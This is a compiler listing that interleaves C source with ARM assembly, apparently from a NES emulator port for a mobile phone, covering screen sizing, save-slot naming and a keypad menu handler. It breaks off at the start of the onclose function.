   \   00000008   0610D0E5           LDRB     R1,[R0, #+6]
    183            if(!(getHeight=param[pheight])) getHeight=256;
   \   0000000C   0720D0E5           LDRB     R2,[R0, #+7]
   \   00000010   000051E3           CMP      R1,#+0
   \   00000014   401FA003           MOVEQ    R1,#+256
   \   00000018   000052E3           CMP      R2,#+0
   \   0000001C   402FA003           MOVEQ    R2,#+256
    184            if(getWidth<64) getWidth=64;
   \   00000020   400051E3           CMP      R1,#+64
   \   00000024   4010A0B3           MOVLT    R1,#+64
   \   00000028   030000BA           BLT      ??getscrXY_0
    185            else if(getWidth>256) getWidth=256;
   \   0000002C   0130A0E3           MOV      R3,#+1
   \   00000030   403F83E3           ORR      R3,R3,#0x100
   \   00000034   030051E1           CMP      R1,R3
   \   00000038   401FA0A3           MOVGE    R1,#+256
   \                     ??getscrXY_0:
   \   0000003C   ........           LDR      R3,??DataTable45  ;; getWidth
    186            if(getHeight<64) getHeight=64;
   \   00000040   400052E3           CMP      R2,#+64
   \   00000044   001083E5           STR      R1,[R3, #+0]
   \   00000048   4020A0B3           MOVLT    R2,#+64
   \   0000004C   010000BA           BLT      ??getscrXY_1
    187            else if(getHeight>240) getHeight=240;
   \   00000050   F10052E3           CMP      R2,#+241
   \   00000054   F020A0A3           MOVGE    R2,#+240
   \                     ??getscrXY_1:
   \   00000058   ........           LDR      R1,??DataTable46  ;; getHeight
    188            screen_length=getWidth*getHeight;
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
    189            if(param[screenx]>getWidth-width) param[screenx]=(getWidth-width<0)? 0: (getWidth-width);
   \   00000060   0B50D0E5           LDRB     R5,[R0, #+11]
   \   00000064   002081E5           STR      R2,[R1, #+0]
   \   00000068   74409FE5           LDR      R4,??getscrXY_2  ;; screen_length
   \   0000006C   92030CE0           MUL      R12,R2,R3
   \   00000070   ........           LDR      R2,??DataTable41  ;; width
   \   00000074   00C084E5           STR      R12,[R4, #+0]
   \   00000078   002092E5           LDR      R2,[R2, #+0]
   \   0000007C   0040A0E3           MOV      R4,#+0
   \   00000080   02C043E0           SUB      R12,R3,R2
   \   00000084   05005CE1           CMP      R12,R5
   \   00000088   030000AA           BGE      ??getscrXY_3
   \   0000008C   00005CE3           CMP      R12,#+0
   \   00000090   0020A043           MOVMI    R2,#+0
   \   00000094   02204350           SUBPL    R2,R3,R2
   \   00000098   0B20C0E5           STRB     R2,[R0, #+11]
    190            if(param[screeny]>getHeight-height) param[screeny]=(getHeight-height<0)? 0:(getHeight-height);
   \                     ??getscrXY_3:
   \   0000009C   ........           LDR      R2,??DataTable42  ;; height
   \   000000A0   0C50D0E5           LDRB     R5,[R0, #+12]
   \   000000A4   002092E5           LDR      R2,[R2, #+0]
   \   000000A8   001091E5           LDR      R1,[R1, #+0]
   \   000000AC   023041E0           SUB      R3,R1,R2
   \   000000B0   050053E1           CMP      R3,R5
   \   000000B4   020000AA           BGE      ??getscrXY_4
   \   000000B8   000053E3           CMP      R3,#+0
   \   000000BC   02404150           SUBPL    R4,R1,R2
   \   000000C0   0C40C0E5           STRB     R4,[R0, #+12]
    191            cls();
   \                     ??getscrXY_4:
   \   000000C4   ........           LDR      R0,??DataTable37  ;; screensize
   \   000000C8   0010A0E3           MOV      R1,#+0
   \   000000CC   000090E5           LDR      R0,[R0, #+0]
   \   000000D0   4021A0E1           ASR      R2,R0,#+2
   \   000000D4   ........           LDR      R0,??DataTable38  ;; screen
   \   000000D8   000090E5           LDR      R0,[R0, #+0]
   \   000000DC   ........           _BLF     memsetd,??memsetd??rA
    192          //  if(1)//C65) 
    193          //    getHeight=130;
    194          //  else if(EL71){ getHeight=getWidth=240;}
    195          //  getHeight=getWidth=100;
    196          //  screen_length=getWidth*getHeight;
    197          }
   \   000000E0   3080BDE8           POP      {R4,R5,PC}       ;; return
   \                     ??getscrXY_2:
   \   000000E4   ........           DC32     screen_length
    198          
    199          //extern void keyPressed(int i1);
    200          //extern void keyReleased(int i1);
    201          
    202          //int keyexit(){
    203          //  running=0; exit=1; saveini(); return 0;
    204          //}
    205          

   \                                 In segment CODE, align 4, keep-with-next
    206          void savename(char c){
   \                     savename:
   \   00000000   10402DE9           PUSH     {R4,LR}
    207            char *s=strrchr(romname,'.');
   \   00000004   2E10A0E3           MOV      R1,#+46
   \   00000008   0040A0E1           MOV      R4,R0
   \   0000000C   1C009FE5           LDR      R0,??savename_0  ;; param + 664
   \   00000010   170100EF           SWI      +279
    208            *++s='s'; *++s=c; *++s=0;
   \   00000014   010080E2           ADD      R0,R0,#+1
   \   00000018   7310A0E3           MOV      R1,#+115
   \   0000001C   ........           STRB     R1,[R0], #+1
   \   00000020   ........           STRB     R4,[R0], #+1
   \   00000024   0010A0E3           MOV      R1,#+0
   \   00000028   0010C0E5           STRB     R1,[R0, #+0]
    209          }
   \   0000002C   1080BDE8           POP      {R4,PC}          ;; return
   \                     ??savename_0:
   \   00000030   ........           DC32     param + 664
    210          
    211          #define JOY_UP 0x10
    212          #define JOY_DOWN 0x20
    213          #define JOY_LEFT 0x40
    214          #define JOY_RIGHT 0x80
    215          #define JOY_START 0x1
    216          #define JOY_SELECT 0x2
    217          #define JOY_AB 3
    218          
    219          #define JOY_A 0x4    
    220          #define JOY_B 0x8
    221          
    222          #define JOY_AA 0xff    
    223          #define JOY_BB 0xfe
    224          
    225          //#define step 8
    226          extern void SetVolume(char Vol);
    227          // keycode - код клавиши, pressed - нажата/отпущена/удерживается

   \                                 In segment CODE, align 4, keep-with-next
    228          int onkey(unsigned char keycode, int pressed){ //  Обработчик клавиш. Вернуть 0 или 1 для выхода
   \                     onkey:
   \   00000000   F04F2DE9           PUSH     {R4-R11,LR}
    229            byte *ptr;
    230            //int f;
    231            switch(pressed){
   \   00000004   ........           LDR      R6,??DataTable49  ;; param
   \   00000008   0070A0E1           MOV      R7,R0
   \   0000000C   9300A0E3           MOV      R0,#+147
   \   00000010   400F80E3           ORR      R0,R0,#0x100
   \   00000014   000051E1           CMP      R1,R0
   \   00000018   0A00000A           BEQ      ??onkey_3
   \   0000001C   650F51E3           CMP      R1,#+404
   \   00000020   0300000A           BEQ      ??onkey_4
   \   00000024   020080E2           ADD      R0,R0,#+2
   \   00000028   000051E1           CMP      R1,R0
   \   0000002C   0500000A           BEQ      ??onkey_3
   \   00000030   0D0100EA           B        ??onkey_5
    232            case KEY_UP: if(!mode) keypress(keycode,0); break; // Клавиша отпущена
   \                     ??onkey_4:
   \   00000034   000196E5           LDR      R0,[R6, #+256]
   \   00000038   000050E3           CMP      R0,#+0
   \   0000003C   2E01001A           BNE      ??onkey_6
   \   00000040   0010A0E3           MOV      R1,#+0
   \   00000044   2A0100EA           B        ??onkey_7
    233            case LONG_PRESS: // Клавиша удерживается долго (повтор)
    234            case KEY_DOWN: // Клавиша нажата
    235              if(exit) return 1; //Выход
   \                     ??onkey_3:
   \   00000048   080196E5           LDR      R0,[R6, #+264]
   \   0000004C   000050E3           CMP      R0,#+0
   \   00000050   0100000A           BEQ      ??onkey_8
   \                     ??onkey_9:
   \   00000054   0100A0E3           MOV      R0,#+1
   \   00000058   F08FBDE8           POP      {R4-R11,PC}
    236              if(keycode==RED_BUTTON)return 1;//keyexit();
   \                     ??onkey_8:
   \   0000005C   0C0057E3           CMP      R7,#+12
   \   00000060   FBFFFF0A           BEQ      ??onkey_9
    237              if(keycode==VOL_UP_BUTTON)
   \   00000064   98049FE5           LDR      R0,??onkey_10    ;; Volume
   \   00000068   0D0057E3           CMP      R7,#+13
   \   0000006C   D000D0E1           LDRSB    R0,[R0, #+0]
    238                  SetVolume( Volume + 1 );
   \   00000070   01008002           ADDEQ    R0,R0,#+1
   \   00000074   0200000A           BEQ      ??onkey_11
    239              if(keycode==VOL_DOWN_BUTTON)
   \   00000078   0E0057E3           CMP      R7,#+14
   \   0000007C   0200001A           BNE      ??onkey_12
    240                  SetVolume( Volume - 1 );
   \   00000080   010040E2           SUB      R0,R0,#+1
   \                     ??onkey_11:
   \   00000084   FF0000E2           AND      R0,R0,#0xFF
   \   00000088   ........           _BLF     SetVolume,??SetVolume??rA
    241              switch(mode){
   \                     ??onkey_12:
   \   0000008C   14C196E5           LDR      R12,[R6, #+276]
   \   00000090   00E196E5           LDR      LR,[R6, #+256]
   \   00000094   0C00A0E1           MOV      R0,R12
   \   00000098   0290D6E5           LDRB     R9,[R6, #+2]
   \   0000009C   0A10A0E3           MOV      R1,#+10
   \   000000A0   917020E0           MLA      R0,R1,R0,R7
   \   000000A4   0710A0E1           MOV      R1,R7
   \   000000A8   D08080E2           ADD      R8,R0,#+208
   \   000000AC   0700A0E1           MOV      R0,R7
   \   000000B0   0320A0E3           MOV      R2,#+3
   \   000000B4   0230A0E3           MOV      R3,#+2
   \   000000B8   0140A0E3           MOV      R4,#+1
   \   000000BC   0050A0E3           MOV      R5,#+0
   \   000000C0   01A04EE2           SUB      R10,LR,#+1
   \   000000C4   63005AE3           CMP      R10,#+99
   \   000000C8   FE00008A           BHI      ??onkey_13
   \   000000CC   02BF8FE2           ADR      R11,??onkey_0
   \   000000D0   8AA0A0E1           MOV      R10,R10, LSL #+1
   \   000000D4   BAB09BE1           LDRH     R11,[R11, R10]
   \   000000D8   0BF18FE0           ADD      PC,PC,R11, LSL #+2
   \                     ??onkey_0:
   \   000000DC   760081008800       DC16     +118,+129,+136,+250
   \              FA00        
   \   000000E4   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   000000EC   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   000000F4   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   000000FC   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000104   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000010C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000114   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000011C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000124   FA00FA00FA00       DC16     +250,+250,+250,+212
   \              D400        
   \   0000012C   D900E500FA00       DC16     +217,+229,+250,+250
   \              FA00        
   \   00000134   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000013C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000144   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000014C   FA00FA00FA00       DC16     +250,+250,+250,+212
   \              D400        
   \   00000154   D900EC00FA00       DC16     +217,+236,+250,+250
   \              FA00        
   \   0000015C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000164   FA00FA00D400       DC16     +250,+250,+212,+243
   \              F300        
   \   0000016C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000174   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000017C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000184   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000018C   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   00000194   FA00FA00FA00       DC16     +250,+250,+250,+250
   \              FA00        
   \   0000019C   FA00AA009300       DC16     +250,+170,+147,+49
   \              3100        
    242              case 100: // main menu
    243                switch(keycode){
   \                     ??onkey_14:
   \   000001A4   0A10D6E5           LDRB     R1,[R6, #+10]
   \   000001A8   0B80D6E5           LDRB     R8,[R6, #+11]
   \   000001AC   0C90D6E5           LDRB     R9,[R6, #+12]
   \   000001B0   0170A0E1           MOV      R7,R1
   \   000001B4   300040E2           SUB      R0,R0,#+48
   \   000001B8   0E0050E3           CMP      R0,#+14
   \   000001BC   1100008A           BHI      ??onkey_15
   \   000001C0   01AF8FE2           ADR      R10,??onkey_1
   \   000001C4   D0A09AE1           LDRSB    R10,[R10, R0]
   \   000001C8   0AF18FE0           ADD      PC,PC,R10, LSL #+2
   \                     ??onkey_1:
   \   000001CC   A1030507           DC8      +161,+3,+5,+7
   \   000001D0   09122814           DC8      +9,+18,+40,+20
   \   000001D4   1038361E           DC8      +16,+56,+54,+30
   \   000001D8   24161C00           DC8      +36,+22,+28,+0
    244                case '0': return 1;//keyexit(); // Exit
    245                case '1': mode=1; break; //load
   \                     ??onkey_16:
   \   000001DC   004186E5           STR      R4,[R6, #+256]
   \   000001E0   A10000EA           B        ??onkey_5
    246                case '2': mode=2; break; //save
   \                     ??onkey_17:
   \   000001E4   003186E5           STR      R3,[R6, #+256]
   \   000001E8   9F0000EA           B        ??onkey_5
    247                case '3': mode=3; break; //frmskip
   \                     ??onkey_18:
   \   000001EC   002186E5           STR      R2,[R6, #+256]
   \   000001F0   9D0000EA           B        ??onkey_5
    248                case '4': t_boolean_static_fld=(t_boolean_static_fld+1)&1; mode=0; break;
   \                     ??onkey_19:
   \   000001F4   ........           LDR      R0,??DataTable53  ;; t_boolean_static_fld
   \   000001F8   0010D0E5           LDRB     R1,[R0, #+0]
   \   000001FC   011081E2           ADD      R1,R1,#+1
   \   00000200   011001E2           AND      R1,R1,#0x1
   \   00000204   0010C0E5           STRB     R1,[R0, #+0]
   \                     ??onkey_15:
   \   00000208   005186E5           STR      R5,[R6, #+256]
   \   0000020C   960000EA           B        ??onkey_5
    249                case '8': mode=40; break; //sizex
   \                     ??onkey_20:
   \   00000210   2800A0E3           MOV      R0,#+40
   \   00000214   930000EA           B        ??onkey_21
    250                case '5': mode=99; break; //redefine
   \                     ??onkey_22:
   \   00000218   6300A0E3           MOV      R0,#+99
   \   0000021C   910000EA           B        ??onkey_21
    251                case '7': mode=71; break;
   \                     ??onkey_23:
   \   00000220   4700A0E3           MOV      R0,#+71
   \   00000224   8F0000EA           B        ??onkey_21
    252                case LEFT_BUTTON: param[screenx]-=(param[screenx]<param[pstep])?param[screenx]:param[pstep]; getscrXY(); break;
   \                     ??onkey_24:
   \   00000228   010058E1           CMP      R8,R1
   \   0000022C   0870A031           MOVCC    R7,R8
   \   00000230   070048E0           SUB      R0,R8,R7
   \                     ??onkey_25:
   \   00000234   0B00C6E5           STRB     R0,[R6, #+11]
   \   00000238   ........           BL       getscrXY
   \   0000023C   8A0000EA           B        ??onkey_5
    253                case RIGHT_BUTTON: param[screenx]+=param[pstep]; getscrXY(); break;
   \                     ??onkey_26:
   \   00000240   080081E0           ADD      R0,R1,R8
   \   00000244   FAFFFFEA           B        ??onkey_25
    254                case UP_BUTTON: param[screeny]-=(param[screeny]<param[pstep])?param[screeny]:param[pstep]; getscrXY(); break;
   \                     ??onkey_27:
   \   00000248   010059E1           CMP      R9,R1
   \   0000024C   0970A031           MOVCC    R7,R9
   \   00000250   070049E0           SUB      R0,R9,R7
   \   00000254   0C00C6E5           STRB     R0,[R6, #+12]
   \   00000258   ........           BL       getscrXY
   \   0000025C   820000EA           B        ??onkey_5
    255                case DOWN_BUTTON: param[screeny]+=param[pstep]; getscrXY(); break;
   \                     ??onkey_28:
   \   00000260   090081E0           ADD      R0,R1,R9
   \   00000264   0C00C6E5           STRB     R0,[R6, #+12]
   \   00000268   ........           BL       getscrXY
   \   0000026C   7E0000EA           B        ??onkey_5
    256                case '6': 
    257                  if(param[pfilter]=(param[pfilter]+1)&1){
   \                     ??onkey_29:
   \   00000270   0900D6E5           LDRB     R0,[R6, #+9]
   \   00000274   010080E2           ADD      R0,R0,#+1
   \   00000278   010010E2           ANDS     R0,R0,#0x1
   \   0000027C   0900C6E5           STRB     R0,[R6, #+9]
    258                    param[pwidth]=0; param[pheight]=240; getscrXY();
   \   00000280   0650C615           STRBNE   R5,[R6, #+6]
   \   00000284   F000A013           MOVNE    R0,#+240
   \   00000288   0400001A           BNE      ??onkey_30
    259                  }else{
    260                     param[pwidth]=width; param[pheight]=height; getscrXY();
   \   0000028C   ........           LDR      R0,??DataTable41  ;; width
   \   00000290   000090E5           LDR      R0,[R0, #+0]
   \   00000294   0600C6E5           STRB     R0,[R6, #+6]
   \   00000298   ........           LDR      R0,??DataTable42  ;; height
   \   0000029C   000090E5           LDR      R0,[R0, #+0]
   \                     ??onkey_30:
   \   000002A0   0700C6E5           STRB     R0,[R6, #+7]
   \                     ??onkey_31:
   \   000002A4   ........           BL       getscrXY
    261                  }
    262                  mode=0; break;
   \                     ??onkey_32:
   \   000002A8   005186E5           STR      R5,[R6, #+256]
   \   000002AC   6E0000EA           B        ??onkey_5
    263                case '9': mode=60; break; //sizey
   \                     ??onkey_33:
   \   000002B0   3C00A0E3           MOV      R0,#+60
   \   000002B4   6B0000EA           B        ??onkey_21
    264              //  case '7': mode=0; cls(); if(++param[protate]>2) param[protate]=0; break; //rotate
    265          //      case '8': mode=0; cls(); param[presize]=~param[presize]; break; //resize
    266          //      case '9': param[pslow]=(param[pslow]+1)&1; break; //slow
    267                default: mode=0; break;
    268                }break;
    269              case 1: //load
    270                if(keycode>='0' && keycode<='9'){ 
   \                     ??onkey_34:
   \   000002B8   300057E3           CMP      R7,#+48
   \   000002BC   D1FFFF3A           BCC      ??onkey_15
   \   000002C0   3A0057E3           CMP      R7,#+58
   \   000002C4   CFFFFF2A           BCS      ??onkey_15
    271                  savename(keycode);
   \   000002C8   ........           BL       savename
    272                  v_boolean_static_fld=o_boolean_static_fld=1;
   \   000002CC   34029FE5           LDR      R0,??onkey_10+0x4  ;; o_boolean_static_fld
   \                     ??onkey_35:
   \   000002D0   005186E5           STR      R5,[R6, #+256]
   \   000002D4   0040C0E5           STRB     R4,[R0, #+0]
   \   000002D8   2C029FE5           LDR      R0,??onkey_10+0x8  ;; v_boolean_static_fld
   \   000002DC   0040C0E5           STRB     R4,[R0, #+0]
   \   000002E0   610000EA           B        ??onkey_5
    273                  //if((f=fopen(romname,A_ReadOnly+A_BIN,P_READ,&err))!=-1){
    274                    //FCEUSS_LoadFP(f);
    275                  //  fclose(f,&err);
    276                  //}
    277                }
    278                mode=0; break;
    279              case 2: //save
    280                if(keycode>='0' && keycode<='9'){
   \                     ??onkey_36:
   \   000002E4   300057E3           CMP      R7,#+48
   \   000002E8   C6FFFF3A           BCC      ??onkey_15
   \   000002EC   3A0057E3           CMP      R7,#+58
   \   000002F0   C4FFFF2A           BCS      ??onkey_15
    281                  savename(keycode);
   \   000002F4   ........           BL       savename
    282                  v_boolean_static_fld=d_boolean_static_fld=1;
   \   000002F8   10029FE5           LDR      R0,??onkey_10+0xC  ;; d_boolean_static_fld
   \   000002FC   F3FFFFEA           B        ??onkey_35
    283                  //if((f=fopen(romname,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))!=-1){
    284                    //FCEUSS_SaveFP(f);
    285                  //  fclose(f,&err);
    286                  //}
    287                }
    288                mode=0; break;
    289              case 3: //frame_skip
    290                if(keycode>='0' && keycode<='9') A=param[pframeskip]=keycode-'0';
   \                     ??onkey_37:
   \   00000300   300057E3           CMP      R7,#+48
   \   00000304   BFFFFF3A           BCC      ??onkey_15
   \   00000308   3A0057E3           CMP      R7,#+58
   \   0000030C   BDFFFF2A           BCS      ??onkey_15
   \   00000310   ........           LDR      R1,??DataTable52  ;; A
   \   00000314   D00087E2           ADD      R0,R7,#+208
   \   00000318   0100C6E5           STRB     R0,[R6, #+1]
   \   0000031C   FF0000E2           AND      R0,R0,#0xFF
   \   00000320   000081E5           STR      R0,[R1, #+0]
   \   00000324   005186E5           STR      R5,[R6, #+256]
   \   00000328   4F0000EA           B        ??onkey_5
    291                mode=0; break;
    292          //    case 5: //redefine
    293          //      mode=99; break;
    294              case 99: //redefine - sel key
    295               switch(keycode){
   \                     ??onkey_38:
   \   0000032C   010050E2           SUBS     R0,R0,#+1
   \   00000330   03005012           SUBSNE   R0,R0,#+3
   \   00000334   08005012           SUBSNE   R0,R0,#+8
   \   00000338   B2FFFF0A           BEQ      ??onkey_15
    296                case RIGHT_SOFT:
    297                case LEFT_SOFT:
    298                //case GREEN_BUTTON: 
    299                case RED_BUTTON: mode=0; break;
    300                default:
    301                ptr=param+(param[palternate]?key2:key1);
   \   0000033C   000059E3           CMP      R9,#+0
   \   00000340   A000A013           MOVNE    R0,#+160
   \   00000344   4000A003           MOVEQ    R0,#+64
   \   00000348   064080E0           ADD      R4,R0,R6
    302                if(!(redefineptr=(byte*)strchr((char*)ptr,keycode))){ //нет клавиши
   \   0000034C   0400A0E1           MOV      R0,R4
   \   00000350   180000EF           SWI      +24
   \   00000354   0C0186E5           STR      R0,[R6, #+268]
   \   00000358   000050E3           CMP      R0,#+0
   \   0000035C   0400001A           BNE      ??onkey_39
    303                  redefineptr=ptr+strlen((char*)ptr);
   \   00000360   0400A0E1           MOV      R0,R4
   \   00000364   1B0000EF           SWI      +27
   \   00000368   040080E0           ADD      R0,R0,R4
   \   0000036C   0C0186E5           STR      R0,[R6, #+268]
    304                  *redefineptr=keycode;
   \   00000370   0070C0E5           STRB     R7,[R0, #+0]
    305                }
    306                 redefineptr+=maxkey;
   \                     ??onkey_39:
   \   00000374   0C0196E5           LDR      R0,[R6, #+268]
   \   00000378   200080E2           ADD      R0,R0,#+32
   \   0000037C   0C0186E5           STR      R0,[R6, #+268]
    307                 mode=98; break;
   \   00000380   6200A0E3           MOV      R0,#+98
   \   00000384   370000EA           B        ??onkey_21
    308               } break; 
    309          
    310              case 98: //select key action
    311                switch(keycode){
   \                     ??onkey_40:
   \   00000388   0C1196E5           LDR      R1,[R6, #+268]
   \   0000038C   2A0040E2           SUB      R0,R0,#+42
   \   00000390   0F0050E3           CMP      R0,#+15
   \   00000394   9BFFFF8A           BHI      ??onkey_15
   \   00000398   017F8FE2           ADR      R7,??onkey_2
   \   0000039C   D07097E1           LDRSB    R7,[R7, R0]
   \   000003A0   07F18FE0           ADD      PC,PC,R7, LSL #+2
   \                     ??onkey_2:
   \   000003A4   1FC0C0C0           DC8      +31,+192,+192,+192
   \   000003A8   C0C00709           DC8      +192,+192,+7,+9
   \   000003AC   0F0C1503           DC8      +15,+12,+21,+3
   \   000003B0   1719111B           DC8      +23,+25,+17,+27
    312          // const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select";
    313           
    314                case '5': *redefineptr=JOY_B; break;
   \                     ??onkey_41:
   \   000003B4   0800A0E3           MOV      R0,#+8
   \                     ??onkey_42:
   \   000003B8   0000C1E5           STRB     R0,[R1, #+0]
   \   000003BC   005186E5           STR      R5,[R6, #+256]
   \   000003C0   290000EA           B        ??onkey_5
    315                case '0': *redefineptr=JOY_A; break;
   \                     ??onkey_43:
   \   000003C4   0400A0E3           MOV      R0,#+4
   \   000003C8   FAFFFFEA           B        ??onkey_42
    316                case '1': *redefineptr=JOY_START; break;
   \                     ??onkey_44:
   \   000003CC   0040C1E5           STRB     R4,[R1, #+0]
   \   000003D0   005186E5           STR      R5,[R6, #+256]
   \   000003D4   240000EA           B        ??onkey_5
    317                case '3': *redefineptr=JOY_SELECT; break;
   \                     ??onkey_45:
   \   000003D8   0030C1E5           STRB     R3,[R1, #+0]
   \   000003DC   005186E5           STR      R5,[R6, #+256]
   \   000003E0   210000EA           B        ??onkey_5
    318                case '2': *redefineptr=JOY_UP; break;
   \                     ??onkey_46:
   \   000003E4   1000A0E3           MOV      R0,#+16
   \   000003E8   F2FFFFEA           B        ??onkey_42
    319                case '8': *redefineptr=JOY_DOWN; break;
   \                     ??onkey_47:
   \   000003EC   2000A0E3           MOV      R0,#+32
   \                     ??onkey_48:
   \   000003F0   0000C1E5           STRB     R0,[R1, #+0]
   \   000003F4   005186E5           STR      R5,[R6, #+256]
   \   000003F8   1B0000EA           B        ??onkey_5
    320                case '4': *redefineptr=JOY_LEFT; break;
   \                     ??onkey_49:
   \   000003FC   4000A0E3           MOV      R0,#+64
   \   00000400   ECFFFFEA           B        ??onkey_42
    321                case '6': *redefineptr=JOY_RIGHT; break;
   \                     ??onkey_50:
   \   00000404   8000A0E3           MOV      R0,#+128
   \   00000408   F8FFFFEA           B        ??onkey_48
    322                case '7':  *redefineptr=JOY_AA; break;
   \                     ??onkey_51:
   \   0000040C   FF00A0E3           MOV      R0,#+255
   \   00000410   E8FFFFEA           B        ??onkey_42
    323                case '9':  *redefineptr=JOY_BB; break;
   \                     ??onkey_52:
   \   00000414   FE00A0E3           MOV      R0,#+254
   \   00000418   0000C1E5           STRB     R0,[R1, #+0]
   \   0000041C   005186E5           STR      R5,[R6, #+256]
   \   00000420   110000EA           B        ??onkey_5
    324                case '*':  *redefineptr=JOY_AB; break;
   \                     ??onkey_53:
   \   00000424   0020C1E5           STRB     R2,[R1, #+0]
   \   00000428   005186E5           STR      R5,[R6, #+256]
   \   0000042C   0E0000EA           B        ??onkey_5
    325                } mode=0; break;
    326          
    327              case 40: if(keycode>='0' && keycode<='9'){ 
   \                     ??onkey_54:
   \   00000430   300057E3           CMP      R7,#+48
   \   00000434   73FFFF3A           BCC      ??onkey_15
   \   00000438   3A0057E3           CMP      R7,#+58
   \   0000043C   71FFFF2A           BCS      ??onkey_15
    328                 tmpsize=keycode-'0'; ++mode;} else mode=0; break;
   \   00000440   050000EA           B        ??onkey_55
    329              case 41: if(keycode>='0' && keycode<='9'){ 
   \                     ??onkey_56:
   \   00000444   300057E3           CMP      R7,#+48
   \   00000448   6EFFFF3A           BCC      ??onkey_15
   \   0000044C   3A0057E3           CMP      R7,#+58
   \   00000450   6CFFFF2A           BCS      ??onkey_15
    330                tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
   \   00000454   0A00A0E3           MOV      R0,#+10
   \   00000458   901C21E0           MLA      R1,R0,R12,R1
   \                     ??onkey_55:
   \   0000045C   300041E2           SUB      R0,R1,#+48
   \   00000460   140186E5           STR      R0,[R6, #+276]
   \   00000464   01008EE2           ADD      R0,LR,#+1
   \                     ??onkey_21:
   \   00000468   000186E5           STR      R0,[R6, #+256]
   \                     ??onkey_5:
   \   0000046C   0000A0E3           MOV      R0,#+0
   \   00000470   F08FBDE8           POP      {R4-R11,PC}
    331              case 42: if(keycode>='0' && keycode<='9'){ 
   \                     ??onkey_57:
   \   00000474   300057E3           CMP      R7,#+48
   \   00000478   62FFFF3A           BCC      ??onkey_15
   \   0000047C   3A0057E3           CMP      R7,#+58
   \   00000480   60FFFF2A           BCS      ??onkey_15
    332                param[pfilter]=0;
   \   00000484   0950C6E5           STRB     R5,[R6, #+9]
    333                param[pwidth]=tmpsize*10+keycode-'0'; getscrXY();
   \   00000488   0680C6E5           STRB     R8,[R6, #+6]
   \   0000048C   84FFFFEA           B        ??onkey_31
    334              } mode=0; break;
    335              
    336              case 60: if(keycode>='0' && keycode<='9'){ 
    337                 tmpsize=keycode-'0'; ++mode;} else mode=0; break;
    338              case 61: if(keycode>='0' && keycode<='9'){ 
    339                tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
    340              case 62: if(keycode>='0' && keycode<='9'){ 
   \                     ??onkey_58:
   \   00000490   300057E3           CMP      R7,#+48
   \   00000494   5BFFFF3A           BCC      ??onkey_15
   \   00000498   3A0057E3           CMP      R7,#+58
   \   0000049C   59FFFF2A           BCS      ??onkey_15
    341                param[pfilter]=0;
   \   000004A0   0950C6E5           STRB     R5,[R6, #+9]
    342                param[pheight]=tmpsize*10+keycode-'0'; getscrXY();
   \   000004A4   0780C6E5           STRB     R8,[R6, #+7]
   \   000004A8   7DFFFFEA           B        ??onkey_31
    343              } mode=0; break;
    344          
    345              case 71:
    346                if(keycode>='0' && keycode<='9'){ tmpsize=keycode-'0'; ++mode;}
    347                else mode=0; break;
    348              case 72:
    349                if(keycode>='0' && keycode<='9')  param[pstep]=tmpsize*10+keycode-'0';
   \                     ??onkey_59:
   \   000004AC   300057E3           CMP      R7,#+48
   \   000004B0   54FFFF3A           BCC      ??onkey_15
   \   000004B4   3A0057E3           CMP      R7,#+58
   \   000004B8   52FFFF2A           BCS      ??onkey_15
   \   000004BC   0A80C6E5           STRB     R8,[R6, #+10]
   \   000004C0   005186E5           STR      R5,[R6, #+256]
   \   000004C4   E8FFFFEA           B        ??onkey_5
    350                mode=0; break;
    351            
    352              case 0: default:
    353                switch(keycode){
   \                     ??onkey_13:
   \   000004C8   010050E2           SUBS     R0,R0,#+1
   \   000004CC   0300000A           BEQ      ??onkey_60
   \   000004D0   030050E2           SUBS     R0,R0,#+3
   \   000004D4   0500001A           BNE      ??onkey_61
    354                case RIGHT_SOFT: mode=100; break; //main menu
   \   000004D8   6400A0E3           MOV      R0,#+100
   \   000004DC   E1FFFFEA           B        ??onkey_21
    355                case LEFT_SOFT: param[palternate]=!param[palternate]; break;
   \                     ??onkey_60:
   \   000004E0   000059E3           CMP      R9,#+0
   \   000004E4   0040A013           MOVNE    R4,#+0
   \   000004E8   0240C6E5           STRB     R4,[R6, #+2]
   \   000004EC   DEFFFFEA           B        ??onkey_5
    356                default: keypress(keycode,1);
   \                     ??onkey_61:
   \   000004F0   0110A0E3           MOV      R1,#+1
   \                     ??onkey_7:
   \   000004F4   0700A0E1           MOV      R0,R7
   \   000004F8   ........           BL       keypress
    357                }break;
    358              }
    359          
    360          //    onredraw(); DrawScreen(); // Перерисовать экран
    361            }
    362            return 0;
   \                     ??onkey_6:
   \   000004FC   0000A0E3           MOV      R0,#+0
   \   00000500   F08FBDE8           POP      {R4-R11,PC}      ;; return
   \                     ??onkey_10:
   \   00000504   ........           DC32     Volume
   \   00000508   ........           DC32     o_boolean_static_fld
   \   0000050C   ........           DC32     v_boolean_static_fld
   \   00000510   ........           DC32     d_boolean_static_fld
    363          }
    364          

   \                                 In segment CODE, align 4, keep-with-next
    365          void onclose(){ // Закрытие окна
    366            running=0; // Сигнал на остановку фонового процесса
   \                     onclose:
   \   00000000   ........           LDR      R0,??DataTable49  ;; param
